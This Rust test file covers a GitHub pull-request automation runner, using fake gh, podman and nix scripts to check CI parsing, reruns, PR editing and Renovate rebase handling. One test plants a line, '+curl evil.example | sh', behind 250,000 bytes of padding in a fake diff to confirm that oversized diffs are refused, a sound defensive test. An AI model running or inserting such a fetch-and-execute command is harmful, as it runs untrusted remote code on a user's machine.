mod support;

use std::fs;
use std::path::{Path, PathBuf};

use factory_core::{Event, PrDescription};
use factory_runner::{
    Access, Account, Ci, FailedCheck, Forge, ForgeAccount, GitHub, LookupError, Observation,
    PrState, RebaseCheckbox, RenovatePr, Rerun, WorkerConfig, actions_job_id, checks_args,
    is_renovate_login, observe, parse_renovate_prs, parse_status, run_checks, tick_rebase_checkbox,
};

const VIEW: &str = r#"{
  "state": "OPEN",
  "headRefOid": "4f1c2e9a7b3d",
  "statusCheckRollup": [
    {"__typename": "CheckRun", "name": "Lint and test", "status": "COMPLETED", "conclusion": "FAILURE",
     "detailsUrl": "https://github.com/o/r/actions/runs/44/job/135"},
    {"__typename": "CheckRun", "name": "Title and description", "status": "COMPLETED", "conclusion": "SUCCESS",
     "detailsUrl": "https://github.com/o/r/actions/runs/45/job/136"},
    {"__typename": "StatusContext", "context": "ci/legacy", "state": "SUCCESS", "targetUrl": "https://ci.example/1"}
  ],
  "comments": [
    {"author": {"login": "moonthebot"}, "body": "Opened by the factory.", "createdAt": "2026-11-19T10:00:00Z"},
    {"author": {"login": "talhahavadar"}, "body": "Please rename the flag.", "createdAt": "2026-11-19T11:00:00Z"},
    {"author": {"login": "dependabot[bot]"}, "body": "Bump", "createdAt": "2026-11-19T11:30:00Z"}
  ],
  "reviews": [
    {"author": {"login": "talhahavadar"}, "body": "", "state": "COMMENTED", "submittedAt": "2026-11-19T12:00:00Z"},
    {"author": {"login": "talhahavadar"}, "body": "Needs a test.", "state": "CHANGES_REQUESTED", "submittedAt": "2026-11-19T12:05:00Z"}
  ]
}"#;

const INLINE: &str = r#"{"user": {"login": "talhahavadar"}, "body": "Use a constant here.", "path": "src/main.rs", "line": 42, "created_at": "2026-11-19T12:01:00Z"}
{"user": {"login": "moonthebot"}, "body": "Done.", "path": "src/main.rs", "line": 42, "created_at": "2026-11-19T12:02:00Z"}
"#;

fn script(dir: &Path, name: &str, body: &str) -> PathBuf {
    support::executable(dir, name, &format!("#!/bin/bash\n{body}\n"))
}

fn description() -> PrDescription {
    PrDescription {
        title: "maestrod: add a reboot endpoint".into(),
        body: "## Why\n\nThe device page needs it.\n".into(),
    }
}

fn ignore() -> Vec<String> {
    vec!["moonthebot".into()]
}

#[test]
fn status_reads_state_checks_and_human_comments() {
    let status = parse_status(VIEW, INLINE, &ignore()).unwrap();
    assert_eq!(status.state, PrState::Open);
    assert_eq!(status.head, "4f1c2e9a7b3d");
    assert_eq!(
        status.ci,
        Ci::Failed(vec![FailedCheck {
            name: "Lint and test".into(),
            url: Some("https://github.com/o/r/actions/runs/44/job/135".into()),
        }])
    );
    let comments: Vec<(&str, Option<&str>)> = status
        .comments
        .iter()
        .map(|c| (c.body.as_str(), c.location.as_deref()))
        .collect();
    assert_eq!(
        comments,
        [
            ("Please rename the flag.", None),
            ("Use a constant here.", Some("src/main.rs:42")),
            ("Needs a test.", None),
        ]
    );
}

#[test]
fn unfinished_checks_are_pending_and_finished_ones_pass() {
    let pending = r#"{"state": "OPEN", "statusCheckRollup": [
        {"name": "Lint and test", "status": "IN_PROGRESS", "conclusion": ""},
        {"context": "ci/legacy", "state": "SUCCESS"}]}"#;
    assert_eq!(
        parse_status(pending, "", &ignore()).unwrap().ci,
        Ci::Pending
    );

    let passed = r#"{"state": "OPEN", "statusCheckRollup": [
        {"name": "Lint and test", "status": "COMPLETED", "conclusion": "SUCCESS"},
        {"name": "Docs", "status": "COMPLETED", "conclusion": "SKIPPED"}]}"#;
    assert_eq!(parse_status(passed, "", &ignore()).unwrap().ci, Ci::Passed);

    let merged = r#"{"state": "MERGED"}"#;
    assert_eq!(
        parse_status(merged, "", &ignore()).unwrap().state,
        PrState::Merged
    );
}

#[test]
fn merge_and_ci_failure_come_before_comments() {
    let mut status = parse_status(VIEW, INLINE, &ignore()).unwrap();
    assert!(matches!(observe(&status, None), Observation::CiFailed(_)));

    status.state = PrState::Merged;
    assert_eq!(observe(&status, None), Observation::Merged);
    status.state = PrState::Closed;
    assert_eq!(observe(&status, None), Observation::Closed);
}

#[test]
fn only_comments_newer_than_the_watermark_are_delivered() {
    let mut status = parse_status(VIEW, INLINE, &ignore()).unwrap();
    status.ci = Ci::Passed;

    let Observation::Comments { text, seen_until } = observe(&status, Some("2026-11-19T11:00:00Z"))
    else {
        panic!("expected comments");
    };
    assert_eq!(seen_until, "2026-11-19T12:05:00Z");
    assert!(!text.contains("rename the flag"));
    assert!(text.contains("talhahavadar on src/main.rs:42:\nUse a constant here."));
    assert!(text.contains("Needs a test."));

    assert_eq!(observe(&status, Some(&seen_until)), Observation::Ready);
}

#[test]
fn actions_job_ids_come_from_job_urls() {
    assert_eq!(
        actions_job_id("https://github.com/o/r/actions/runs/44/job/135"),
        Some("135")
    );
    assert_eq!(
        actions_job_id("https://github.com/o/r/actions/runs/44/job/135?pr=9"),
        Some("135")
    );
    assert_eq!(actions_job_id("https://ci.example/1"), None);
}

#[tokio::test]
async fn open_pr_creates_the_pull_request_once_and_then_edits_it() {
    let dir = tempfile::tempdir().unwrap();
    let calls = dir.path().join("calls");
    let body = dir.path().join("body");
    let open = dir.path().join("open");
    let gh = script(
        dir.path(),
        "gh",
        &format!(
            r#"echo "$@" >> '{calls}'
case "$1 $2" in
  "pr list") cat '{open}' 2>/dev/null || echo null ;;
  "pr create") cat > '{body}'; echo 12 > '{open}'; echo "https://github.com/o/r/pull/12" ;;
  "pr edit") cat > '{body}' ;;
esac"#,
            calls = calls.display(),
            body = body.display(),
            open = open.display()
        ),
    );
    let github = GitHub {
        gh,
        ..GitHub::default()
    };

    let secret = Account {
        token: Some("ghp_secret".into()),
        ..account()
    };
    let number = github
        .open_pr(&secret, "o/r", "main", "factory/job-7-pr-1", &description())
        .await
        .unwrap();
    assert_eq!(number, 12);
    assert_eq!(fs::read_to_string(&body).unwrap(), description().body);

    let revised = PrDescription {
        body: "## Why\n\nRevised.\n".into(),
        ..description()
    };
    let number = github
        .open_pr(&secret, "o/r", "main", "factory/job-7-pr-1", &revised)
        .await
        .unwrap();
    assert_eq!(number, 12);
    assert_eq!(fs::read_to_string(&body).unwrap(), revised.body);

    let calls = fs::read_to_string(&calls).unwrap();
    let kinds: Vec<&str> = calls
        .lines()
        .map(|line| line.split(' ').take(2).last().unwrap())
        .collect();
    assert_eq!(
        kinds,
        ["list", "create", "list", "view", "--paginate", "edit"]
    );
    assert!(calls.contains("--head factory/job-7-pr-1"));
    assert!(!calls.contains("ghp_secret"));
}

#[tokio::test]
async fn the_failure_report_has_each_failed_jobs_log() {
    let dir = tempfile::tempdir().unwrap();
    let gh = script(
        dir.path(),
        "gh",
        r#"if [ "$1 $2" = "run view" ]; then echo "test job_flow ... FAILED (job $6)"; fi"#,
    );
    let github = GitHub {
        gh,
        ..GitHub::default()
    };
    let report = github
        .failure_report(
            &account(),
            "o/r",
            &[
                FailedCheck {
                    name: "Lint and test".into(),
                    url: Some("https://github.com/o/r/actions/runs/44/job/135".into()),
                },
                FailedCheck {
                    name: "ci/legacy".into(),
                    url: Some("https://ci.example/1".into()),
                },
            ],
        )
        .await
        .unwrap();
    assert!(report.contains("Check \"Lint and test\" failed."));
    assert!(report.contains("FAILED (job 135)"));
    assert!(report.contains("Details: https://ci.example/1"));
}

#[test]
fn checks_run_with_bash_in_the_checkout_without_tokens() {
    let config = WorkerConfig {
        volumes: vec!["factory-nix:/nix".into()],
        ..WorkerConfig::default()
    };
    let args: Vec<String> = checks_args(
        &config,
        "factory-job-7",
        Path::new("/jobs/7/work"),
        "just lint",
        &[],
    )
    .iter()
    .map(|arg| arg.to_string_lossy().into_owned())
    .collect();
    assert!(args.iter().any(|arg| arg == "/jobs/7/work:/work"));
    assert!(args.iter().any(|arg| arg == "factory-nix:/nix"));
    assert_eq!(args[args.len() - 3..], ["bash", "-lc", "just lint"]);
    assert!(!args.iter().any(|arg| arg.contains("secret")));
}

#[test]
fn checks_with_packages_run_the_command_inside_nix_shell() {
    let config = WorkerConfig::default();
    let packages = ["a".to_owned(), "b".to_owned()];
    let args: Vec<String> = checks_args(
        &config,
        "factory-job-7",
        Path::new("/jobs/7/work"),
        "just lint; echo $HOME",
        &packages,
    )
    .iter()
    .map(|arg| arg.to_string_lossy().into_owned())
    .collect();
    let image = args.iter().position(|arg| *arg == config.image).unwrap();
    assert_eq!(args[image + 1], "bash");
    assert_eq!(args[image + 2], "-c");
    assert!(args[image + 3].contains("nix shell"));
    assert!(!args[image + 3].contains("just lint"));
    assert_eq!(
        args[image + 4..],
        [
            "factory-worker-packages",
            "2",
            "a",
            "b",
            "bash",
            "-c",
            "just lint; echo $HOME"
        ]
    );
}

/// Runs the generated wrapper for `command` under a fake `nix` whose build
/// and shell steps succeed or fail as given, and returns its exit code.
fn wrapper_exit(build_ok: bool, shell_ok: bool, command: &str) -> Option<i32> {
    wrapper_run(build_ok, shell_ok, command, true).0
}

/// Like [`wrapper_exit`], with a temporary directory that can be missing, and
/// whether the command ran, which it does by creating `$RAN`.
fn wrapper_run(
    build_ok: bool,
    shell_ok: bool,
    command: &str,
    tmp_exists: bool,
) -> (Option<i32>, bool) {
    let dir = tempfile::tempdir().unwrap();
    let nix = format!(
        "case \"$1\" in\nbuild) {} ;;\nshell) {} ;;\nesac",
        if build_ok { "exit 0" } else { "exit 1" },
        if shell_ok {
            "while [ \"$1\" != --command ]; do shift; done; shift; exec \"$@\""
        } else {
            "exit 1"
        },
    );
    script(dir.path(), "nix", &nix);
    let config = WorkerConfig::default();
    let args: Vec<String> = checks_args(
        &config,
        "factory-job-7",
        Path::new("/jobs/7/work"),
        command,
        &["--".to_owned(), "b".to_owned()],
    )
    .iter()
    .map(|arg| arg.to_string_lossy().into_owned())
    .collect();
    let image = args.iter().position(|arg| *arg == config.image).unwrap();
    let path = format!(
        "{}:{}",
        dir.path().display(),
        std::env::var("PATH").unwrap()
    );
    let tmp = dir.path().join("tmp");
    if tmp_exists {
        fs::create_dir(&tmp).unwrap();
    }
    let ran = dir.path().join("ran");
    let code = std::process::Command::new(&args[image + 1])
        .args(&args[image + 2..])
        .env("PATH", path)
        .env("TMPDIR", &tmp)
        .env("RAN", &ran)
        .status()
        .unwrap()
        .code();
    if tmp_exists {
        assert_eq!(fs::read_dir(&tmp).unwrap().count(), 0, "left a marker");
    }
    (code, ran.exists())
}

#[test]
fn the_wrapper_does_not_run_the_command_when_its_start_signal_cannot_be_set_up() {
    assert_eq!(
        wrapper_run(true, true, "touch \"$RAN\"", false),
        (Some(86), false)
    );
}

#[test]
fn the_wrapper_tells_setup_failures_from_command_failures() {
    assert_eq!(wrapper_exit(true, true, "exit 0"), Some(0));
    assert_eq!(wrapper_exit(true, true, "exit 3"), Some(3));
    assert_eq!(wrapper_exit(false, true, "exit 0"), Some(86));
    assert_eq!(wrapper_exit(true, false, "exit 0"), Some(86));
    assert_eq!(wrapper_exit(true, true, "exit 86"), Some(1));
    assert_eq!(
        wrapper_exit(true, true, "rm -f \"$TMPDIR\"/tmp.*; exit 3"),
        Some(3)
    );
}

#[tokio::test]
async fn packages_that_cannot_be_installed_are_a_checks_error() {
    let dir = tempfile::tempdir().unwrap();
    let podman = script(
        dir.path(),
        "podman",
        "echo 'error: attribute nope missing' >&2\nexit 86",
    );
    let config = WorkerConfig {
        podman,
        ..WorkerConfig::default()
    };
    let packages = ["nope".to_owned()];
    let err = run_checks(
        &config,
        "factory-job-7",
        Path::new("/jobs/7/work"),
        "just lint",
        &packages,
    )
    .await
    .unwrap_err();
    assert!(err.contains("worker packages (nope)"), "{err}");
    assert!(err.contains("attribute nope missing"), "{err}");
}

#[tokio::test]
async fn check_results_become_events_and_podman_errors_are_retried() {
    let dir = tempfile::tempdir().unwrap();
    let run = |code: i32, output: &str| {
        let podman = script(
            dir.path(),
            &format!("podman-{code}"),
            &format!("echo '{output}'\nexit {code}"),
        );
        let config = WorkerConfig {
            podman,
            ..WorkerConfig::default()
        };
        async move {
            run_checks(
                &config,
                "factory-job-7",
                Path::new("/jobs/7/work"),
                "just lint",
                &[],
            )
            .await
        }
    };

    assert_eq!(run(0, "ok").await, Ok(Event::ChecksPassed));
    let Ok(Event::ChecksFailed { report }) = run(1, "clippy: unused variable").await else {
        panic!("expected ChecksFailed");
    };
    assert!(report.contains("`just lint` failed"));
    assert!(report.contains("clippy: unused variable"));
    let err = run(125, "Error: image not known").await.unwrap_err();
    assert!(err.contains("image not known"), "{err}");
}

#[test]
fn a_green_pull_request_without_new_comments_is_ready() {
    let mut status = parse_status(VIEW, INLINE, &ignore()).unwrap();
    status.ci = Ci::Passed;
    assert_eq!(
        observe(&status, Some("2026-11-19T12:05:00Z")),
        Observation::Ready
    );

    status.ci = Ci::Pending;
    assert_eq!(
        observe(&status, Some("2026-11-19T12:05:00Z")),
        Observation::Nothing
    );
}

#[test]
fn a_pull_request_without_any_checks_is_not_ready() {
    let status = parse_status(
        r#"{"state": "OPEN", "statusCheckRollup": []}"#,
        "",
        &ignore(),
    )
    .unwrap();
    assert_eq!(status.ci, Ci::NoChecks);
    assert_eq!(observe(&status, None), Observation::Nothing);
}

#[tokio::test]
async fn merged_pr_finds_the_merged_pull_request_for_a_branch() {
    let dir = tempfile::tempdir().unwrap();
    let calls = dir.path().join("calls");
    let gh = script(
        dir.path(),
        "gh",
        &format!(
            r#"echo "$@" >> '{calls}'
case "$*" in
  *job-7-pr-1*) echo 12 ;;
  *) echo null ;;
esac"#,
            calls = calls.display()
        ),
    );
    let github = GitHub {
        gh,
        ..GitHub::default()
    };

    assert_eq!(
        github
            .merged_pr(&account(), "o/r", "factory/job-7-pr-1")
            .await
            .unwrap(),
        Some(12)
    );
    assert_eq!(
        github
            .merged_pr(&account(), "o/r", "factory/job-7-pr-2")
            .await
            .unwrap(),
        None
    );
    let calls = fs::read_to_string(&calls).unwrap();
    assert!(
        calls.starts_with("pr list --repo o/r --head factory/job-7-pr-1 --state merged"),
        "{calls}"
    );
}

#[tokio::test]
async fn merge_squashes_and_deletes_the_branch() {
    let dir = tempfile::tempdir().unwrap();
    let calls = dir.path().join("calls");
    let gh = script(
        dir.path(),
        "gh",
        &format!("echo \"$@\" >> '{}'", calls.display()),
    );
    let github = GitHub {
        gh,
        ..GitHub::default()
    };
    github.merge(&account(), "o/r", 15).await.unwrap();
    assert_eq!(
        fs::read_to_string(&calls).unwrap(),
        "pr merge 15 --repo o/r --squash --delete-branch\n"
    );
}

#[test]
fn a_conflict_comes_before_ci_and_comments() {
    let conflicting = VIEW.replacen(
        "\"state\": \"OPEN\",",
        "\"state\": \"OPEN\", \"mergeable\": \"CONFLICTING\",",
        1,
    );
    let status = parse_status(&conflicting, INLINE, &ignore()).unwrap();
    assert!(status.conflicting);
    assert_eq!(observe(&status, None), Observation::Conflicted);

    for mergeable in ["MERGEABLE", "UNKNOWN"] {
        let view = VIEW.replacen(
            "\"state\": \"OPEN\",",
            &format!("\"state\": \"OPEN\", \"mergeable\": \"{mergeable}\","),
            1,
        );
        let status = parse_status(&view, INLINE, &ignore()).unwrap();
        assert!(!status.conflicting, "{mergeable}");
        assert!(matches!(observe(&status, None), Observation::CiFailed(_)));
    }
}

const RUNS: &str = r#"[
  {"databaseId": 44, "conclusion": "failure"},
  {"databaseId": 45, "conclusion": "success"},
  {"databaseId": 46, "conclusion": "timed_out"},
  {"databaseId": 47, "conclusion": ""}
]"#;

fn check(conclusion: &str) -> String {
    format!(
        r#"{{"state": "OPEN", "statusCheckRollup": [{{"name": "Lint and test", "status": "COMPLETED", "conclusion": "{conclusion}"}}]}}"#
    )
}

/// A fake gh for a pull request 12 whose checks read `before` until a
/// `gh run rerun` call and `after` from then on. Returns the gh path and the
/// file that records each call.
fn rerun_gh(dir: &Path, before: &str, after: &str, runs: &str) -> (PathBuf, PathBuf) {
    let calls = dir.join("calls");
    fs::write(dir.join("before"), before).unwrap();
    fs::write(dir.join("after"), after).unwrap();
    fs::write(dir.join("runs"), runs).unwrap();
    let gh = script(
        dir,
        "gh",
        &format!(
            r#"echo "$@" >> '{calls}'
case "$1 $2" in
  "pr list") echo 12 ;;
  "pr edit") cat > /dev/null ;;
  "pr view")
    case "$*" in
      *"--jq .headRefOid"*) echo abc123 ;;
      *) if [ -e '{dir}/rerun' ]; then cat '{dir}/after'; else cat '{dir}/before'; fi ;;
    esac ;;
  "run list") cat '{dir}/runs' ;;
  "run rerun") touch '{dir}/rerun' ;;
esac"#,
            calls = calls.display(),
            dir = dir.display()
        ),
    );
    (gh, calls)
}

fn quick(gh: PathBuf) -> GitHub {
    GitHub {
        gh,
        settle_polls: 3,
        settle_interval: std::time::Duration::ZERO,
        ..GitHub::default()
    }
}

#[tokio::test]
async fn rerun_failed_reruns_each_failed_run_and_no_passed_one() {
    let dir = tempfile::tempdir().unwrap();
    let (gh, calls) = rerun_gh(dir.path(), &check("FAILURE"), &check("SUCCESS"), RUNS);

    let rerun = quick(gh).rerun_failed(&account(), "o/r", 12).await.unwrap();

    assert_eq!(rerun, Rerun::Started(vec![44, 46]));
    let calls = fs::read_to_string(&calls).unwrap();
    assert!(calls.contains("run list --repo o/r --commit abc123"));
    let reruns: Vec<&str> = calls
        .lines()
        .filter(|l| l.starts_with("run rerun"))
        .collect();
    assert_eq!(
        reruns,
        [
            "run rerun 44 --repo o/r --failed",
            "run rerun 46 --repo o/r --failed"
        ]
    );
}

#[tokio::test]
async fn rerun_failed_reports_when_no_run_failed() {
    let dir = tempfile::tempdir().unwrap();
    let runs = r#"[{"databaseId": 45, "conclusion": "success"}]"#;
    let (gh, calls) = rerun_gh(dir.path(), &check("FAILURE"), &check("FAILURE"), runs);

    let rerun = quick(gh).rerun_failed(&account(), "o/r", 12).await.unwrap();

    assert_eq!(rerun, Rerun::NothingToRerun);
    assert!(!fs::read_to_string(&calls).unwrap().contains("run rerun"));
}

#[tokio::test]
async fn rerun_failed_waits_until_the_old_failure_is_gone() {
    let dir = tempfile::tempdir().unwrap();
    let (gh, calls) = rerun_gh(dir.path(), &check("FAILURE"), &check("FAILURE"), RUNS);
    // GitHub still reports the failure, so every poll reads it.
    quick(gh).rerun_failed(&account(), "o/r", 12).await.unwrap();
    let reads = fs::read_to_string(&calls)
        .unwrap()
        .lines()
        .filter(|l| l.starts_with("pr view") && l.contains("statusCheckRollup"))
        .count();
    assert_eq!(reads, 3);

    let dir = tempfile::tempdir().unwrap();
    let (gh, calls) = rerun_gh(dir.path(), &check("FAILURE"), &check("SUCCESS"), RUNS);
    quick(gh).rerun_failed(&account(), "o/r", 12).await.unwrap();
    let reads = fs::read_to_string(&calls)
        .unwrap()
        .lines()
        .filter(|l| l.starts_with("pr view") && l.contains("statusCheckRollup"))
        .count();
    assert_eq!(reads, 1);
}

async fn edit_and_count_reruns(before: &str) -> usize {
    let dir = tempfile::tempdir().unwrap();
    let (gh, calls) = rerun_gh(dir.path(), before, &check("SUCCESS"), RUNS);
    let number = quick(gh)
        .open_pr(
            &account(),
            "o/r",
            "main",
            "factory/job-7-pr-1",
            &description(),
        )
        .await
        .unwrap();
    assert_eq!(number, 12);
    let calls = fs::read_to_string(&calls).unwrap();
    let edit = calls
        .lines()
        .position(|l| l.starts_with("pr edit"))
        .unwrap();
    let rerun = calls.lines().position(|l| l.starts_with("run rerun"));
    assert!(
        rerun.is_none_or(|rerun| rerun > edit),
        "rerun before the edit"
    );
    calls.lines().filter(|l| l.starts_with("run rerun")).count()
}

#[tokio::test]
async fn editing_a_pr_with_failed_checks_reruns_them_after_the_edit() {
    assert_eq!(edit_and_count_reruns(&check("FAILURE")).await, 2);
}

#[tokio::test]
async fn editing_a_pr_whose_checks_did_not_fail_reruns_nothing() {
    assert_eq!(edit_and_count_reruns(&check("SUCCESS")).await, 0);
    let pending =
        r#"{"state": "OPEN", "statusCheckRollup": [{"name": "x", "status": "IN_PROGRESS"}]}"#;
    assert_eq!(edit_and_count_reruns(pending).await, 0);
    assert_eq!(edit_and_count_reruns(r#"{"state": "OPEN"}"#).await, 0);
}

#[tokio::test]
async fn a_failed_rerun_does_not_fail_the_edit() {
    let dir = tempfile::tempdir().unwrap();
    let (gh, _) = rerun_gh(dir.path(), &check("FAILURE"), &check("FAILURE"), "not json");
    let number = quick(gh)
        .open_pr(
            &account(),
            "o/r",
            "main",
            "factory/job-7-pr-1",
            &description(),
        )
        .await
        .unwrap();
    assert_eq!(number, 12);
}

fn recording_github(dir: &Path, body: &str) -> (GitHub, PathBuf) {
    let calls = dir.join("calls");
    let gh = script(
        dir,
        "gh",
        &format!("echo \"$@\" >> '{}'\n{body}", calls.display()),
    );
    (
        GitHub {
            gh,
            ..GitHub::default()
        },
        calls,
    )
}

#[test]
fn renovate_authors_are_the_rest_api_logins() {
    assert!(is_renovate_login("renovate[bot]"));
    assert!(is_renovate_login("renovate"));
    assert!(!is_renovate_login("app/renovate"));
    assert!(!is_renovate_login("dependabot[bot]"));
}

#[test]
fn renovate_prs_keep_only_renovate_authors() {
    let lines = r#"{"number": 5, "title": "Update dep", "html_url": "https://github.com/o/r/pull/5", "user": {"login": "renovate[bot]"}, "head": {"sha": "aaa"}}
{"number": 6, "title": "Bump", "html_url": "https://github.com/o/r/pull/6", "user": {"login": "dependabot[bot]"}, "head": {"sha": "bbb"}}
{"number": 7, "title": "Update other", "html_url": "https://github.com/o/r/pull/7", "user": {"login": "renovate"}, "head": {"sha": "ccc"}}
{"number": 8, "title": "Ghost", "html_url": "https://github.com/o/r/pull/8", "user": null, "head": {"sha": "ddd"}}
"#;
    let prs = parse_renovate_prs(lines).unwrap();
    assert_eq!(
        prs,
        [
            RenovatePr {
                number: 5,
                title: "Update dep".into(),
                url: "https://github.com/o/r/pull/5".into(),
                head: "aaa".into(),
            },
            RenovatePr {
                number: 7,
                title: "Update other".into(),
                url: "https://github.com/o/r/pull/7".into(),
                head: "ccc".into(),
            },
        ]
    );
    assert!(parse_renovate_prs("not json").is_err());
}

#[tokio::test]
async fn renovate_prs_lists_open_pull_requests_on_the_base() {
    let dir = tempfile::tempdir().unwrap();
    let (github, calls) = recording_github(
        dir.path(),
        r#"echo '{"number": 5, "title": "Update dep", "html_url": "u", "user": {"login": "renovate[bot]"}, "head": {"sha": "aaa"}}'"#,
    );
    let prs = github
        .renovate_prs(&account(), "o/r", "main", None)
        .await
        .unwrap();
    assert_eq!(prs.len(), 1);
    assert_eq!(prs[0].number, 5);
    assert_eq!(
        fs::read_to_string(&calls).unwrap(),
        "api --paginate --method GET repos/o/r/pulls -f state=open -f base=main -f per_page=100 --jq .[]\n"
    );
}

#[tokio::test]
async fn pr_details_reads_the_view_and_the_diff() {
    let dir = tempfile::tempdir().unwrap();
    let (github, calls) = recording_github(
        dir.path(),
        r#"if [ "$2" = view ]; then
  echo '{"title": "Update dep", "body": "Notes", "headRefOid": "abc", "files": [{"path": "go.mod"}, {"path": "go.sum"}]}'
else
  echo 'diff --git a/go.mod b/go.mod'
fi"#,
    );
    let details = github.pr_details(&account(), "o/r", 5).await.unwrap();
    assert_eq!(details.title, "Update dep");
    assert_eq!(details.body, "Notes");
    assert_eq!(details.head, "abc");
    assert_eq!(details.files, ["go.mod", "go.sum"]);
    assert_eq!(details.diff, "diff --git a/go.mod b/go.mod\n");
    assert_eq!(
        fs::read_to_string(&calls).unwrap(),
        "pr view 5 --repo o/r --json title,body,headRefOid,files\npr diff 5 --repo o/r\n"
    );
}

#[tokio::test]
async fn pr_details_refuses_a_diff_too_large_to_review_in_full() {
    let dir = tempfile::tempdir().unwrap();
    let (github, _) = recording_github(
        dir.path(),
        r#"if [ "$2" = view ]; then
  echo '{"title": "t", "body": "", "headRefOid": "abc", "files": []}'
else
  head -c 250000 /dev/zero | tr '\0' 'x'
  echo
  echo '+curl evil.example | sh'
fi"#,
    );
    let err = github.pr_details(&account(), "o/r", 5).await.unwrap_err();
    assert!(err.contains("cannot be reviewed in full"), "{err}");
}

#[tokio::test]
async fn a_gh_that_exits_without_reading_the_body_still_succeeds() {
    let dir = tempfile::tempdir().unwrap();
    let (github, _) = recording_github(dir.path(), "exit 0");
    let big = "x".repeat(256 * 1024);
    github.comment(&account(), "o/r", 5, &big).await.unwrap();
    github
        .approve(&account(), "o/r", 5, "abc", &big)
        .await
        .unwrap();
}

#[tokio::test]
async fn a_gh_that_fails_before_reading_the_body_reports_its_stderr() {
    let dir = tempfile::tempdir().unwrap();
    let (github, _) = recording_github(dir.path(), "echo 'bad credentials' >&2; exit 1");
    let big = "x".repeat(256 * 1024);
    let errors = [
        github
            .comment(&account(), "o/r", 5, &big)
            .await
            .unwrap_err(),
        github
            .approve(&account(), "o/r", 5, "abc", &big)
            .await
            .unwrap_err(),
    ];
    for err in errors {
        assert!(err.contains("bad credentials"), "{err}");
        assert!(!err.contains("Broken pipe"), "{err}");
    }
}

#[tokio::test]
async fn comment_and_approve_send_the_body_on_stdin() {
    let dir = tempfile::tempdir().unwrap();
    let stdin = dir.path().join("stdin");
    let (github, calls) = recording_github(dir.path(), &format!("cat >> '{}'", stdin.display()));
    github
        .comment(&account(), "o/r", 5, "It stopped.")
        .await
        .unwrap();
    github
        .approve(&account(), "o/r", 5, "abc123", "Looks safe.")
        .await
        .unwrap();
    assert_eq!(
        fs::read_to_string(&calls).unwrap(),
        "pr comment 5 --repo o/r --body-file -\napi --method POST repos/o/r/pulls/5/reviews -f event=APPROVE -f commit_id=abc123 -F body=@-\n"
    );
    assert_eq!(
        fs::read_to_string(&stdin).unwrap(),
        "It stopped.Looks safe."
    );
}

const RENOVATE_BLOCK: &str = "---\r\n\r\n - [ ] <!-- rebase-check -->If you want to rebase/retry this PR, click this checkbox.\r\n\r\n---\r\n";

fn renovate_body() -> String {
    format!(
        "Update dep to v2.\r\n\r\nNotes - [ ] not a box\r\n\r\n{RENOVATE_BLOCK}Generated by Renovate."
    )
}

fn view_json(body: &str) -> String {
    serde_json::json!({ "body": body, "headRefOid": "h1" }).to_string()
}

fn rebase_github(dir: &Path, body: &str) -> (GitHub, PathBuf, PathBuf) {
    let view = dir.join("view.json");
    fs::write(&view, view_json(body)).unwrap();
    let stdin = dir.join("stdin");
    let script = format!(
        "if [ \"$1\" = pr ]; then cat '{}'; elif [ \"$1\" = api ]; then cat > '{}'; fi",
        view.display(),
        stdin.display()
    );
    let (github, calls) = recording_github(dir, &script);
    (github, calls, stdin)
}

#[test]
fn ticking_changes_only_the_marker_line() {
    let body = renovate_body();
    let ticked = tick_rebase_checkbox(&body).unwrap();
    assert_eq!(
        ticked,
        body.replace(
            " - [ ] <!-- rebase-check -->",
            " - [x] <!-- rebase-check -->"
        )
    );
    assert!(ticked.contains("Notes - [ ] not a box\r\n"));
    assert!(ticked.ends_with("Generated by Renovate."));
}

#[test]
fn ticking_needs_the_marker_and_keeps_a_ticked_box() {
    assert_eq!(tick_rebase_checkbox("- [ ] something\n"), None);
    assert_eq!(tick_rebase_checkbox(""), None);
    assert_eq!(tick_rebase_checkbox("- [X] <!-- rebase-check -->\n"), None);
    assert_eq!(tick_rebase_checkbox("- [ ]  <!-- rebase-check -->\n"), None);
    assert_eq!(
        tick_rebase_checkbox("<!-- rebase-check --> - [ ] <!-- rebase-check -->go\n").as_deref(),
        Some("<!-- rebase-check --> - [x] <!-- rebase-check -->go\n")
    );
    assert_eq!(tick_rebase_checkbox("<!-- rebase-check -->\n"), None);
    assert_eq!(
        tick_rebase_checkbox("- [ ] unrelated <!-- rebase-check -->\n"),
        None
    );
    assert_eq!(
        tick_rebase_checkbox("<!-- rebase-check -->\n - [ ] <!-- rebase-check -->go\n").as_deref(),
        Some("<!-- rebase-check -->\n - [x] <!-- rebase-check -->go\n")
    );
    let ticked = " - [x] <!-- rebase-check -->retry\n";
    assert_eq!(tick_rebase_checkbox(ticked).as_deref(), Some(ticked));
    assert_eq!(
        tick_rebase_checkbox("- [ ] <!-- rebase-check -->a\n- [ ] <!-- rebase-check -->b\n")
            .as_deref(),
        Some("- [x] <!-- rebase-check -->a\n- [ ] <!-- rebase-check -->b\n")
    );
}

#[tokio::test]
async fn request_renovate_rebase_writes_the_ticked_description() {
    let dir = tempfile::tempdir().unwrap();
    let body = renovate_body();
    let (github, calls, stdin) = rebase_github(dir.path(), &body);
    let result = github
        .request_renovate_rebase(&account(), "o/r", 5, "h1")
        .await
        .unwrap();
    assert_eq!(result, RebaseCheckbox::Ticked);
    assert_eq!(
        fs::read_to_string(&calls).unwrap(),
        "pr view 5 --repo o/r --json body,headRefOid\napi --method PATCH repos/o/r/pulls/5 -F body=@-\n"
    );
    assert_eq!(
        fs::read_to_string(&stdin).unwrap(),
        tick_rebase_checkbox(&body).unwrap()
    );
}

#[tokio::test]
async fn request_renovate_rebase_without_a_checkbox_writes_nothing() {
    let dir = tempfile::tempdir().unwrap();
    let (github, calls, _) = rebase_github(dir.path(), "Update dep.\n- [ ] other\n");
    let result = github
        .request_renovate_rebase(&account(), "o/r", 5, "h1")
        .await
        .unwrap();
    assert_eq!(result, RebaseCheckbox::Missing);
    assert_eq!(
        fs::read_to_string(&calls).unwrap(),
        "pr view 5 --repo o/r --json body,headRefOid\n"
    );
}

#[tokio::test]
async fn request_renovate_rebase_ignores_a_marker_without_a_checkbox() {
    let dir = tempfile::tempdir().unwrap();
    let (github, calls, _) = rebase_github(
        dir.path(),
        "Update dep.\n<!-- rebase-check -->\n- [ ] unrelated <!-- rebase-check -->\n",
    );
    let result = github
        .request_renovate_rebase(&account(), "o/r", 5, "h1")
        .await
        .unwrap();
    assert_eq!(result, RebaseCheckbox::Missing);
    assert_eq!(
        fs::read_to_string(&calls).unwrap(),
        "pr view 5 --repo o/r --json body,headRefOid\n"
    );
}

#[tokio::test]
async fn request_renovate_rebase_skips_the_write_when_already_ticked() {
    let dir = tempfile::tempdir().unwrap();
